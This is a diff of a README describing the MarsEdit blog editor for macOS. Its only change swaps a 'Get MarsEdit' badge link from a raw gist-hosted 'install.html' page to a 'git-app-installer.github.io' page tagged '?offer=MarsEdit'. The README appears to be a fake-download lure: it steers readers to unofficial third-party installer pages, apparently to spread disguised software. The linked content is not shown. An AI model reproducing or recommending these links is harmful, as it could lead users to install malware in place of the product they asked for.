@@ -3,7 +3,7 @@
 MarsEdit is a professional blog editor for macOS that allows writers and content creators to write, preview, and publish posts efficiently.  
 It offers native macOS integration, live previews, and seamless publishing to popular blogging platforms.
 
-<a href="https://gistcdn.githack.com/punisher1990-design/1c509ad98debc1056ce4b9b3aca585d4/raw/b6c3a644b2299bdd956ef3ea14bd0900348674bc/install.html?offer=MarsEdit" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MarsEdit" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MarsEdit%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
